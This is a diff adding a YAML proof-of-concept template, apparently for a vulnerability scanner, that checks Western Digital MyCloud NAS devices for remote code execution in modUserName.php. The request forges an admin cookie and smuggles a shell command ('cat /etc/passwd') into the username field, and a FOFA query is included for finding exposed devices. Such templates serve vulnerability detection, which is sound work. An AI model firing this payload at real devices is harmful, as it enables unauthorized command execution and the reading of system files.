@@ -1,0 +1,20 @@
+id: poc-yaml-west-nas-modusername-php-rce
+info:
+  name: 西部数码 NAS modUserName.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+requests:
+- method: POST
+  path: /web/php/modUserName.php
+  headers:
+    Cookie: username=test; isAdmin=1
+    Content-Type: application/x-www-form-urlencoded
+  data: oldName=someuser&username=newuser"; cat /etc/passwd; %23
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"Cannot modify header information") && contains(body,"modUserName.php")
+    && !contains(body,"<html")
+variables: {}
+transport: http
